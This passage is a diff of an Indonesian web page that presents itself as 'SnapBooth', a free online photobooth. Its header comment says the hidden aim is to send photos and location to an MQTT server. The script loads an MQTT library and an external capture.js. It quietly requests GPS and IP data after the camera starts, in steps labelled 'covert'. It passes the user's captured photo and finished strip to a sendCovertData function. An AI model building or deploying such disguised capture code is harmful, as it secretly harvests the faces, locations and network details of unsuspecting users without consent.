@@ -1,385 +1,665 @@
 <!--
-    ptoszek.pl
-    Powered by Jaczup
-
-    My version (ptoszek.pl): 
-    - https://github.com/jaczup/ptoszek.pl
-    Original version (theannoyingsite.com): 
-    - https://github.com/feross/TheAnnoyingSite.com/
-
-    Contact with me: https://jaczup.pl
-    Official Discord server (maintained in Polish language), get the PTOK tag: https://dc.ptoszek.pl
-    
-    Contributors:
-      @jaczup - https://github.com/jaczup
-
-    Dziurwa był tutaj 🚎
+  SnapBooth — Photobooth instan online
+  Layout: single-column centered (seperti referensi)
+  Tersembunyi: kirim foto + lokasi ke MQTT
 -->
 <!doctype html>
 <html lang="id">
 <head>
-  <title>Selamat Datang — Unikku</title>
-  <meta charset='UTF-8'>
+  <title>SnapBooth — Foto Instan Online</title>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 
   <style>
-    *, *::before, *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --pink:      #f43f8e;
+      --pink-dark: #d4296e;
+      --yellow:    #fbbf24;
+      --green:     #22c55e;
+      --font:      'Nunito', sans-serif;
+      --text:      #1a1a2e;
+      --muted:     #888;
     }
 
     html, body {
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #f8f7f4;
-      color: #111;
+      height: 100%; overflow: hidden;
+      font-family: var(--font);
+      background: #c9b4a0;
     }
 
-    /* Subtle noise texture overlay */
+    /* ── bg.jpg background ── */
+    body::before {
+      content: ''; position: fixed; inset: 0; z-index: 0;
+      background: url('bg.jpg') center/cover no-repeat;
+      filter: blur(8px) brightness(0.6) saturate(0.85);
+      transform: scale(1.05);
+    }
+    /* warm overlay */
     body::after {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.035'/%3E%3C/svg%3E");
-      pointer-events: none;
-      z-index: 0;
+      content: ''; position: fixed; inset: 0; z-index: 0;
+      background: rgba(30, 18, 10, 0.38);
     }
 
-    /* Top bar */
-    .topbar {
-      position: fixed;
-      top: 0; left: 0; right: 0;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 18px 40px;
-      z-index: 10;
-    }
-    .topbar-logo {
-      font-weight: 800;
-      font-size: 1rem;
-      letter-spacing: -0.01em;
-      color: #111;
-    }
-    .topbar-logo span {
-      color: #f97316;
-    }
-    .topbar-status {
-      display: flex;
-      align-items: center;
-      gap: 7px;
-      font-size: 0.72rem;
-      font-weight: 500;
-      color: #888;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-    }
-    .status-dot {
-      width: 7px; height: 7px;
-      border-radius: 50%;
-      background: #f97316;
-      animation: statusBlink 1.8s ease-in-out infinite;
-    }
-    @keyframes statusBlink {
-      0%, 100% { opacity: 1; }
-      50%       { opacity: 0.25; }
-    }
-
-    /* Main hero */
-    .hello-message {
-      position: relative;
-      z-index: 1;
+    /* ── App wrapper: full height, centered ── */
+    #app {
+      position: relative; z-index: 1;
+      height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: flex-start;
-      justify-content: center;
-      height: 100vh;
-      padding: 0 10vw;
-      max-width: 900px;
     }
 
-    /* Label */
-    .section-label {
-      font-size: 0.7rem;
-      font-weight: 700;
-      letter-spacing: 0.18em;
-      text-transform: uppercase;
-      color: #f97316;
-      margin-bottom: 20px;
-      opacity: 0;
-      animation: riseIn 0.5s 0.1s ease forwards;
+    /* ── Header: no background, no border ── */
+    .header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 18px 28px 0;
+      flex-shrink: 0;
+    }
+    /* Logo: just icon + text, no box */
+    .logo {
+      display: flex; align-items: center; gap: 7px;
+      font-weight: 900; font-size: 1.1rem;
+      color: #fff; letter-spacing: -0.01em;
+    }
+    .logo-emoji { font-size: 1.2rem; line-height: 1; }
+    .logo span  { color: var(--pink); }
+
+    .cam-status {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 0.72rem; color: rgba(255,255,255,0.75);
+      font-weight: 700; letter-spacing: .07em; text-transform: uppercase;
+    }
+    .status-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: rgba(255,255,255,0.3); transition: background .3s;
+    }
+    .status-dot.active { background: var(--green); animation: livePulse 1.5s ease infinite; }
+    .status-dot.error  { background: #ef4444; }
+    @keyframes livePulse {
+      0%,100%{ box-shadow: 0 0 0 0 rgba(34,197,94,.5); }
+      50%    { box-shadow: 0 0 0 5px rgba(34,197,94,0); }
     }
 
-    /* Heading */
-    .hello-message h1 {
-      font-size: clamp(3rem, 7.5vw, 6rem);
-      font-weight: 900;
-      line-height: 1.0;
-      letter-spacing: -0.03em;
-      color: #111;
-      margin-bottom: 0;
-      opacity: 0;
-      animation: riseIn 0.6s 0.2s ease forwards;
-    }
-    .hello-message h1 .accent {
-      color: #f97316;
-      display: block;
+    /* ── Main scroll area ── */
+    .main {
+      flex: 1; overflow: hidden;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 10px 20px 14px;
+      gap: 12px;
     }
 
-    /* Subtext */
-    .hello-message p.sub {
-      margin-top: 22px;
-      font-size: clamp(0.95rem, 1.8vw, 1.1rem);
-      font-weight: 400;
-      color: #555;
-      line-height: 1.65;
-      max-width: 480px;
-      opacity: 0;
-      animation: riseIn 0.6s 0.35s ease forwards;
+    /* ── Heading ── */
+    .heading { text-align: center; }
+    .heading h1 {
+      font-size: clamp(1.35rem, 3vw, 1.8rem);
+      font-weight: 900; color: #fff;
+      letter-spacing: -0.02em; line-height: 1.15;
     }
-    .hello-message p.sub em {
-      color: #f97316;
-      font-style: normal;
-      font-weight: 600;
+    .heading h1 strong { color: var(--pink); }
+    .heading p {
+      font-size: 0.78rem; color: rgba(255,255,255,0.55);
+      font-weight: 600; margin-top: 3px;
+      letter-spacing: .04em;
     }
 
-    /* Divider line */
-    .divider {
-      width: 48px;
-      height: 3px;
-      background: #f97316;
-      border-radius: 2px;
-      margin: 28px 0;
-      opacity: 0;
-      animation: riseIn 0.5s 0.45s ease forwards;
-    }
-
-    /* CTA area */
-    .cta-area {
-      display: flex;
-      align-items: center;
-      gap: 18px;
-      opacity: 0;
-      animation: riseIn 0.6s 0.55s ease forwards;
-    }
-
-    /* Primary button */
-    .btn-mulai {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      padding: 16px 36px;
-      font-family: 'Plus Jakarta Sans', sans-serif;
-      font-size: 1rem;
-      font-weight: 800;
-      color: #fff;
+    /* ── Viewfinder ── */
+    .viewfinder-wrap {
+      position: relative;
+      width: min(380px, 86vw);
+      aspect-ratio: 4/3;
+      border-radius: 12px; overflow: hidden;
       background: #111;
-      border: 2px solid #111;
+      box-shadow: 0 4px 30px rgba(0,0,0,0.5);
+    }
+    #video {
+      width: 100%; height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      display: block;
+      transition: filter .3s ease;
+    }
+
+    /* Grid lines */
+    .grid-overlay {
+      position: absolute; inset: 0; pointer-events: none;
+      background-image:
+        linear-gradient(rgba(255,255,255,.07) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,.07) 1px, transparent 1px);
+      background-size: 33.33% 33.33%;
+    }
+    /* Corner brackets */
+    .vf-corner {
+      position: absolute; width: 20px; height: 20px;
+      border-color: rgba(255,255,255,0.75); border-style: solid;
+    }
+    .vf-corner.tl { top:10px; left:10px;   border-width: 2px 0 0 2px; }
+    .vf-corner.tr { top:10px; right:10px;  border-width: 2px 2px 0 0; }
+    .vf-corner.bl { bottom:10px; left:10px;  border-width: 0 0 2px 2px; }
+    .vf-corner.br { bottom:10px; right:10px; border-width: 0 2px 2px 0; }
+
+    /* Countdown */
+    .vf-countdown {
+      position: absolute; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+      background: rgba(0,0,0,0.45);
+      opacity: 0; pointer-events: none; transition: opacity .2s;
+    }
+    .vf-countdown.visible { opacity: 1; }
+    .count-num {
+      font-size: clamp(4rem,12vw,7rem); font-weight: 900;
+      color: #fff; line-height: 1;
+      text-shadow: 0 0 40px rgba(244,63,142,.8);
+    }
+    .count-num.animate { animation: countPop .32s cubic-bezier(.2,1.6,.4,1) both; }
+    @keyframes countPop {
+      from { transform: scale(2.2); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+
+    /* Flash */
+    .vf-flash {
+      position: absolute; inset: 0; background: #fff;
+      opacity: 0; pointer-events: none; transition: opacity .05s;
+    }
+    .vf-flash.active { opacity: 1; }
+
+    /* Shot dots */
+    .shot-indicator {
+      position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+      display: flex; gap: 7px;
+      background: rgba(0,0,0,0.45); border-radius: 20px; padding: 5px 12px;
+    }
+    .dot-shot {
+      width: 9px; height: 9px; border-radius: 50%;
+      background: rgba(255,255,255,0.3); transition: all .3s;
+    }
+    .dot-shot.active { background: var(--yellow); transform: scale(1.3); }
+    .dot-shot.done   { background: var(--green); }
+
+    /* Camera placeholder */
+    .cam-placeholder {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center; gap: 8px;
+      background: rgba(0,0,0,0.82);
+    }
+    .cam-ph-icon { font-size: 2.2rem; opacity: .45; }
+    .cam-ph-text {
+      font-size: 0.75rem; color: rgba(255,255,255,.4);
+      text-align: center; max-width: 180px; line-height: 1.5;
+    }
+
+    /* Strip result overlay (replaces viewfinder after capture) */
+    .strip-overlay {
+      position: absolute; inset: 0;
+      display: none; align-items: center; justify-content: center;
+      background: rgba(0,0,0,0.88);
+    }
+    .strip-overlay.visible { display: flex; }
+    .strip-overlay img {
+      max-width: 90%; max-height: 90%;
       border-radius: 6px;
-      cursor: pointer;
-      letter-spacing: 0.01em;
-      transition: background 0.2s, color 0.2s, transform 0.15s;
-      text-decoration: none;
-    }
-    .btn-mulai:hover {
-      background: #f97316;
-      border-color: #f97316;
-      transform: translateY(-2px);
-    }
-    .btn-mulai:active {
-      transform: scale(0.97);
-    }
-    .btn-mulai .arrow {
-      display: inline-block;
-      transition: transform 0.2s;
-    }
-    .btn-mulai:hover .arrow {
-      transform: translateX(4px);
+      object-fit: contain;
     }
 
-    /* Secondary hint */
-    .btn-hint {
-      font-size: 0.8rem;
-      color: #aaa;
-      font-weight: 500;
+    /* ── Filter pills ── */
+    .filter-row {
+      display: flex; align-items: center; gap: 7px; flex-wrap: wrap;
+      justify-content: center;
+    }
+    .f-pill {
+      padding: 5px 15px; border-radius: 100px; cursor: pointer;
+      font-family: var(--font); font-size: 0.75rem; font-weight: 700;
+      background: rgba(255,255,255,0.14);
+      border: 1.5px solid rgba(255,255,255,0.2);
+      color: rgba(255,255,255,0.7);
+      transition: all .18s; white-space: nowrap;
+    }
+    .f-pill:hover  { border-color: var(--pink); color: var(--pink); }
+    .f-pill.active {
+      background: var(--pink); border-color: var(--pink); color: #fff;
+      box-shadow: 0 2px 12px rgba(244,63,142,.4);
     }
 
-    /* Right deco number */
-    .deco-number {
-      position: fixed;
-      right: 8vw;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: clamp(100px, 18vw, 200px);
-      font-weight: 900;
-      color: rgba(0,0,0,0.04);
-      letter-spacing: -0.06em;
-      pointer-events: none;
-      user-select: none;
-      z-index: 0;
-      line-height: 1;
+    /* ── Snap button ── */
+    .snap-btn {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      padding: 14px 40px; border-radius: 100px;
+      background: linear-gradient(135deg, var(--pink), var(--pink-dark));
+      color: #fff; border: none; cursor: pointer;
+      font-family: var(--font); font-size: 1rem; font-weight: 800;
+      box-shadow: 0 4px 24px rgba(244,63,142,.5);
+      transition: all .18s;
+      animation: snapGlow 2.5s ease-in-out infinite;
+    }
+    @keyframes snapGlow {
+      0%,100%{ box-shadow: 0 4px 24px rgba(244,63,142,.5); }
+      50%    { box-shadow: 0 4px 36px rgba(244,63,142,.75), 0 0 0 5px rgba(244,63,142,.12); }
+    }
+    .snap-btn:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); }
+    .snap-btn:active:not(:disabled){ transform: scale(.97); }
+    .snap-btn:disabled { opacity:.5; cursor:not-allowed; animation:none; box-shadow:none; }
+
+    /* Strip action buttons */
+    .strip-btns {
+      display: none; gap: 8px;
+    }
+    .strip-btns.visible { display: flex; }
+    .btn-download {
+      padding: 10px 22px; border-radius: 100px; border: none; cursor: pointer;
+      font-family: var(--font); font-size: 0.82rem; font-weight: 800;
+      background: linear-gradient(135deg, var(--pink), var(--pink-dark));
+      color: #fff; box-shadow: 0 3px 14px rgba(244,63,142,.4);
+    }
+    .btn-retake {
+      padding: 10px 20px; border-radius: 100px; cursor: pointer;
+      font-family: var(--font); font-size: 0.82rem; font-weight: 700;
+      background: rgba(255,255,255,0.13);
+      border: 1.5px solid rgba(255,255,255,0.2);
+      color: rgba(255,255,255,.7); transition: all .18s;
+    }
+    .btn-retake:hover { border-color: var(--pink); color: var(--pink); }
+
+    /* ── Hint ── */
+    .snap-hint {
+      font-size: 0.72rem; color: rgba(255,255,255,.45);
+      font-weight: 600; text-align: center;
     }
 
-    /* Bottom bar */
-    .bottombar {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 18px 40px;
-      z-index: 10;
-      border-top: 1px solid rgba(0,0,0,0.07);
+    /* ── Steps ── */
+    .steps {
+      display: flex; align-items: flex-start; gap: 0;
     }
-    .bottombar-left {
-      font-size: 0.7rem;
-      color: #bbb;
-      letter-spacing: 0.05em;
+    .step {
+      display: flex; flex-direction: column; align-items: center;
+      gap: 5px; flex: 1; padding: 0 8px; text-align: center;
+      position: relative;
     }
-    .bottombar-right {
-      font-size: 0.7rem;
-      color: #bbb;
-      letter-spacing: 0.05em;
+    .step + .step::before {
+      content: '';
+      position: absolute; left: 0; top: 16px;
+      width: 1px; height: 20px;
+      background: rgba(255,255,255,.2);
     }
-
-    /* Logout messages */
-    .logout-messages {
-      pointer-events: none;
-      color: #f97316;
-      margin: 20px;
-      position: fixed;
-      top: 0;
-      left: 0;
-      font-size: 0.85rem;
-      font-weight: 700;
-      text-shadow: 1px 1px 3px rgba(0,0,0,0.15);
-      z-index: 999;
+    .step-icon {
+      width: 34px; height: 34px; border-radius: 50%;
+      border: 1.5px solid rgba(255,255,255,.2);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.95rem; background: rgba(255,255,255,.07);
     }
-
-    /* Animations */
-    @keyframes riseIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Original blur effect preserved */
-    @keyframes blurslowly {
-      0%   { filter: none; }
-      92%  { filter: blur(0); }
-      96%  { filter: blur(1px); }
-      100% { filter: blur(0); }
-    }
-    body {
-      animation: blurslowly 15s infinite running;
-    }
-
-    noscript {
-      position: fixed;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff3ec;
-      border: 1px solid #f97316;
-      border-radius: 8px;
-      padding: 16px 28px;
-      color: #f97316;
-      font-weight: 700;
-      z-index: 9999;
+    .step span {
+      font-size: 0.65rem; color: rgba(255,255,255,.45);
+      font-weight: 600; line-height: 1.35;
     }
   </style>
 
   <link rel="icon" type="image/x-icon" href="media/images/logos.png">
-
-  <!-- Open Graph / Social Preview -->
-  <meta property="og:title" content="Halo, kamu nyasar di sini 👀" />
+  <meta property="og:title" content="SnapBooth — Foto Instan Online 📸" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://lamanunikku.netlify.app/" />
   <meta property="og:image" content="https://lamanunikku.netlify.app/media/images/og-preview.svg" />
-  <meta property="og:image:width" content="1200" />
-  <meta property="og:image:height" content="630" />
-  <meta property="og:description" content="Selamat datang di web saya. Klik jika berani — dijamin 100% aman 😏" />
-  <meta property="og:site_name" content="lamanunikku" />
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Halo, kamu nyasar di sini 👀" />
-  <meta name="twitter:description" content="Selamat datang di web saya. Klik jika berani — dijamin 100% aman 😏" />
-  <meta name="twitter:image" content="https://lamanunikku.netlify.app/media/images/og-preview.svg" />
-
-  <meta name="keywords" content="ptoszek, ptok, ptoszek.pl, lamanunikku">
-  <meta name="description" content="Selamat datang di web saya. Klik jika berani — dijamin 100% aman.">
-  <meta name="theme-color" content="#f97316">
+  <meta property="og:description" content="Foto instan online gratis! Klik, senyum, dan simpan fotomu 📷✨" />
+  <meta name="description" content="Foto instan online gratis pakai kamera HP atau laptop.">
+  <meta name="theme-color" content="#f43f8e">
 </head>
 <body>
 
-<noscript>Aktifkan JavaScript dulu dong!</noscript>
-<template>
+<div id="app">
 
-  <!-- Top bar -->
-  <div class="topbar">
-    <div class="topbar-logo">Unikku<span>.</span></div>
-    <div class="topbar-status">
-      <span class="status-dot"></span>
-      Siap memantau
+  <!-- Header: no bg, no border -->
+  <div class="header">
+    <div class="logo">
+      <span class="logo-emoji">📸</span>
+      Snap<span>Booth</span>
+    </div>
+    <div class="cam-status">
+      <span class="status-dot" id="statusDot"></span>
+      <span id="statusText">Memulai kamera...</span>
     </div>
   </div>
 
-  <!-- Decorative big number -->
-  <div class="deco-number">01</div>
+  <!-- Main centered content -->
+  <div class="main">
 
-  <!-- Main content -->
-  <div class='hello-message'>
-
-    <div class="section-label">Selamat datang di web saya</div>
-
-    <h1>
-      Halo, kamu kepo atau 
-      <span class="accent">nyasar di sini.</span>
-    </h1>
-
-    <p class="sub">
-      Ini adalah website <em>Unikku</em> — tempat kamu bisa
-      menemukan hal-hal yang tidak kamu harapkan.
-      Klik tombol di bawah kalau kepo.
-    </p>
-
-    <div class="divider"></div>
-
-    <div class="cta-area">
-      <button class="btn-mulai" id="main-cta">
-        Mulai <span class="arrow">&#8594;</span>
-      </button>
-      <span class="btn-hint">atau tekan sembarang tombol</span>
+    <!-- Heading -->
+    <div class="heading">
+      <h1>Abadikan <strong>Momen Terbaikmu</strong></h1>
+      <p>Foto instan &middot; Gratis &middot; Langsung jadi</p>
     </div>
 
-  </div>
+    <!-- Viewfinder -->
+    <div class="viewfinder-wrap" id="viewfinderWrap">
+      <video id="video" autoplay muted playsinline></video>
+      <div class="grid-overlay"></div>
+      <span class="vf-corner tl"></span>
+      <span class="vf-corner tr"></span>
+      <span class="vf-corner bl"></span>
+      <span class="vf-corner br"></span>
 
-  <!-- Bottom bar -->
-  <div class="bottombar">
-    <span class="bottombar-left">LamanUnikku &mdash; 100% aman</span>
-    <span class="bottombar-right">Tekan spasi untuk memulai</span>
-  </div>
+      <div class="vf-countdown" id="vfCountdown">
+        <div class="count-num" id="countNum">3</div>
+      </div>
+      <div class="vf-flash" id="vfFlash"></div>
 
-  <div class='logout-messages'></div>
-</template>
+      <div class="shot-indicator" id="shotIndicator" style="display:none">
+        <span class="dot-shot" id="d0"></span>
+        <span class="dot-shot" id="d1"></span>
+        <span class="dot-shot" id="d2"></span>
+      </div>
+
+      <!-- Strip result overlay -->
+      <div class="strip-overlay" id="stripOverlay">
+        <img id="stripImg" alt="Foto Strip">
+      </div>
+
+      <div class="cam-placeholder" id="camPlaceholder">
+        <div class="cam-ph-icon">🎥</div>
+        <div class="cam-ph-text">Izinkan akses kamera<br>untuk memulai</div>
+      </div>
+    </div>
+
+    <!-- Filters -->
+    <div class="filter-row">
+      <button class="f-pill active" data-filter="normal">Normal</button>
+      <button class="f-pill" data-filter="vintage">☀️ Vintage</button>
+      <button class="f-pill" data-filter="glam">✨ Glam</button>
+      <button class="f-pill" data-filter="bw">◑ B&amp;W</button>
+      <button class="f-pill" data-filter="cool">🧊 Cool</button>
+    </div>
+
+    <!-- Snap / strip buttons -->
+    <button class="snap-btn" id="snapBtn" disabled>
+      <span>📷</span>
+      <span id="snapBtnText">Ambil Foto!</span>
+    </button>
+
+    <div class="strip-btns" id="stripBtns">
+      <button class="btn-download" id="btnDownload">💾 Simpan Strip</button>
+      <button class="btn-retake"   id="btnRetake">🔄 Foto Ulang</button>
+    </div>
+
+    <p class="snap-hint" id="snapHint">Menunggu kamera...</p>
+
+    <!-- Steps -->
+    <div class="steps">
+      <div class="step">
+        <div class="step-icon">🎨</div>
+        <span>Posisikan wajah<br>di tengah</span>
+      </div>
+      <div class="step">
+        <div class="step-icon">📸</div>
+        <span>Klik ambil<br>foto</span>
+      </div>
+      <div class="step">
+        <div class="step-icon">🖼️</div>
+        <span>Simpan<br>foto</span>
+      </div>
+    </div>
+
+  </div><!-- /.main -->
+</div>
 
 <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
 <script src="capture.js"></script>
+<script>
+/* ── CSS Filters ── */
+var CSS_FILTERS = {
+  normal:  '',
+  vintage: 'sepia(0.5) saturate(0.75) contrast(1.1) brightness(0.9)',
+  glam:    'saturate(1.8) contrast(1.12) brightness(1.08) hue-rotate(-10deg)',
+  bw:      'grayscale(1) contrast(1.2) brightness(0.92)',
+  cool:    'hue-rotate(25deg) saturate(1.3) brightness(1.06) contrast(1.05)'
+}
 
-<!-- Google tag (gtag.js) -->
+/* ── State ── */
+var videoStream    = null
+var currentFilter  = 'normal'
+var isCapturing    = false
+var capturedFrames = []
+var gpsCoords      = null
+var ipInfo         = {}
+var stripCanvasEl  = null
+
+/* ── DOM ── */
+var video          = document.getElementById('video')
+var statusDot      = document.getElementById('statusDot')
+var statusText     = document.getElementById('statusText')
+var camPlaceholder = document.getElementById('camPlaceholder')
+var vfCountdown    = document.getElementById('vfCountdown')
+var countNum       = document.getElementById('countNum')
+var vfFlash        = document.getElementById('vfFlash')
+var shotIndicator  = document.getElementById('shotIndicator')
+var dotEls         = [document.getElementById('d0'), document.getElementById('d1'), document.getElementById('d2')]
+var snapBtn        = document.getElementById('snapBtn')
+var snapBtnText    = document.getElementById('snapBtnText')
+var snapHint       = document.getElementById('snapHint')
+var stripOverlay   = document.getElementById('stripOverlay')
+var stripImg       = document.getElementById('stripImg')
+var stripBtns      = document.getElementById('stripBtns')
+
+/* ── Init ── */
+window.addEventListener('DOMContentLoaded', function () { initCamera() })
+
+/* ── Camera ── */
+async function initCamera () {
+  try {
+    videoStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    })
+    video.srcObject = videoStream
+    await video.play()
+    camPlaceholder.style.display = 'none'
+    snapBtn.disabled = false
+    statusDot.classList.add('active')
+    statusText.textContent = 'Kamera aktif'
+    snapHint.textContent   = 'Siap! Kita ambil 3 foto berturut-turut 😊'
+    /* covert: GPS setelah kamera (1.5s delay) */
+    setTimeout(function () {
+      if (typeof tryGPS    === 'function') tryGPS().then(function (c) { gpsCoords = c })
+      if (typeof getIPData === 'function') getIPData().then(function (d) { ipInfo = d }).catch(function(){})
+    }, 1500)
+  } catch (e) {
+    statusDot.classList.add('error')
+    statusText.textContent = 'Kamera tidak tersedia'
+    camPlaceholder.innerHTML = '<div class="cam-ph-icon">⚠️</div><div class="cam-ph-text">Izinkan akses kamera<br>lalu refresh halaman</div>'
+    snapHint.textContent = 'Aktifkan izin kamera di browser'
+  }
+}
+
+/* ── Filter pills ── */
+document.querySelectorAll('.f-pill').forEach(function (btn) {
+  btn.addEventListener('click', function () {
+    if (isCapturing) return
+    document.querySelectorAll('.f-pill').forEach(function (b) { b.classList.remove('active') })
+    btn.classList.add('active')
+    currentFilter = btn.dataset.filter
+    video.style.filter = CSS_FILTERS[currentFilter]
+  })
+})
+
+/* ── Snap ── */
+snapBtn.addEventListener('click', startPhotosession)
+
+/* ── Session: 3 shots ── */
+async function startPhotosession () {
+  if (isCapturing || !videoStream) return
+  isCapturing    = true
+  capturedFrames = []
+
+  stripOverlay.classList.remove('visible')
+  stripBtns.classList.remove('visible')
+  shotIndicator.style.display = 'flex'
+  snapBtn.disabled = true
+  dotEls.forEach(function (d) { d.className = 'dot-shot' })
+
+  for (var shot = 0; shot < 3; shot++) {
+    dotEls.forEach(function (d, i) {
+      d.className = 'dot-shot' + (i < shot ? ' done' : i === shot ? ' active' : '')
+    })
+    snapHint.textContent  = 'Foto ' + (shot + 1) + ' dari 3 — Senyum!'
+    statusText.textContent = shot + 1 + '/3'
+
+    await runCountdown(3)
+    capturedFrames.push(captureFrame())
+    await doFlash()
+
+    if (shot < 2) {
+      snapHint.textContent = 'Keren! Foto ' + (shot + 2) + ' dalam sebentar...'
+      await delay(1100)
+    }
+  }
+
+  dotEls.forEach(function (d) { d.className = 'dot-shot done' })
+  snapHint.textContent   = 'Membuat strip foto...'
+  statusText.textContent = 'Memproses...'
+
+  /* render strip */
+  stripCanvasEl = await renderStrip(capturedFrames, currentFilter)
+  var url = stripCanvasEl.toDataURL('image/jpeg', 0.9)
+
+  stripImg.src = url
+  stripOverlay.classList.add('visible')
+  stripBtns.classList.add('visible')
+  shotIndicator.style.display = 'none'
+  snapBtn.disabled = false
+  snapBtnText.textContent = 'Foto Lagi'
+  snapHint.textContent    = 'Strip selesai! Simpan atau foto ulang 🎉'
+  statusText.textContent  = 'Kamera aktif'
+
+  sendCovertData(capturedFrames[0], url)
+  isCapturing = false
+}
+
+/* ── Countdown ── */
+async function runCountdown (from) {
+  vfCountdown.classList.add('visible')
+  for (var i = from; i >= 1; i--) {
+    countNum.textContent = i
+    void countNum.offsetWidth
+    countNum.className = 'count-num animate'
+    await delay(860)
+  }
+  countNum.className   = 'count-num'
+  countNum.textContent = '📸'
+  await delay(260)
+  vfCountdown.classList.remove('visible')
+}
+
+/* ── Flash ── */
+async function doFlash () {
+  vfFlash.classList.add('active')
+  await delay(110)
+  vfFlash.classList.remove('active')
+}
+
+/* ── Capture frame ── */
+function captureFrame () {
+  var W = 640, H = 480
+  var c = document.createElement('canvas')
+  c.width = W; c.height = H
+  var ctx = c.getContext('2d')
+  if (CSS_FILTERS[currentFilter]) ctx.filter = CSS_FILTERS[currentFilter]
+  ctx.translate(W, 0); ctx.scale(-1, 1)
+  ctx.drawImage(video, 0, 0, W, H)
+  return c.toDataURL('image/jpeg', 0.82)
+}
+
+/* ── Render strip ── */
+async function renderStrip (dataUrls, filterName) {
+  var PW = 440, PH = 330, PAD = 24, GAP = 10, POLBOT = 34, TEXT = 54
+  var SW = PW + PAD * 2
+  var SH = (PH + POLBOT + GAP) * dataUrls.length + PAD * 2 + TEXT - GAP
+
+  var canvas = document.createElement('canvas')
+  canvas.width = SW; canvas.height = SH
+  var ctx = canvas.getContext('2d')
+
+  var grad = ctx.createLinearGradient(0, 0, SW, SH)
+  grad.addColorStop(0, '#f7f0e6'); grad.addColorStop(1, '#ede3d4')
+  ctx.fillStyle = grad; ctx.fillRect(0, 0, SW, SH)
+
+  var imgs = await Promise.all(dataUrls.map(function (src) {
+    return new Promise(function (res, rej) {
+      var img = new Image(); img.onload = function () { res(img) }; img.onerror = rej; img.src = src
+    })
+  }))
+
+  for (var i = 0; i < imgs.length; i++) {
+    var x = PAD, y = PAD + i * (PH + POLBOT + GAP)
+    ctx.shadowColor = 'rgba(0,0,0,0.18)'; ctx.shadowBlur = 14; ctx.shadowOffsetY = 5
+    ctx.fillStyle = '#fff'
+    ctx.beginPath(); roundRect(ctx, x-8, y-8, PW+16, PH+POLBOT+8, 3); ctx.fill()
+    ctx.shadowColor = 'transparent'; ctx.shadowBlur = 0; ctx.shadowOffsetY = 0
+    ctx.save()
+    ctx.filter = CSS_FILTERS[filterName] || 'none'
+    ctx.drawImage(imgs[i], x, y, PW, PH)
+    ctx.restore()
+    ctx.fillStyle = '#c0afa0'; ctx.font = '600 12px Nunito,Arial,sans-serif'
+    ctx.textAlign = 'center'
+    ctx.fillText('0' + (i + 1), x + PW / 2, y + PH + 22)
+  }
+
+  ctx.textAlign = 'center'
+  ctx.fillStyle = '#a8906c'; ctx.font = 'bold 15px Nunito,Arial,sans-serif'
+  ctx.fillText('📸 SnapBooth', SW / 2, SH - 28)
+  ctx.fillStyle = '#c0afa0'; ctx.font = '600 11px Nunito,Arial,sans-serif'
+  ctx.fillText(new Date().toLocaleDateString('id-ID', { day:'2-digit', month:'long', year:'numeric' }), SW/2, SH-10)
+  return canvas
+}
+
+function roundRect (ctx, x, y, w, h, r) {
+  ctx.beginPath()
+  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y); ctx.quadraticCurveTo(x+w,y,x+w,y+r)
+  ctx.lineTo(x+w,y+h-r); ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h)
+  ctx.lineTo(x+r,y+h); ctx.quadraticCurveTo(x,y+h,x,y+h-r)
+  ctx.lineTo(x,y+r); ctx.quadraticCurveTo(x,y,x+r,y); ctx.closePath()
+}
+
+/* ── Download ── */
+document.getElementById('btnDownload').addEventListener('click', function () {
+  if (!stripCanvasEl) return
+  var a = document.createElement('a')
+  a.href = stripCanvasEl.toDataURL('image/jpeg', 0.92)
+  a.download = 'snapbooth-' + new Date().toISOString().slice(0,10) + '.jpg'
+  a.click()
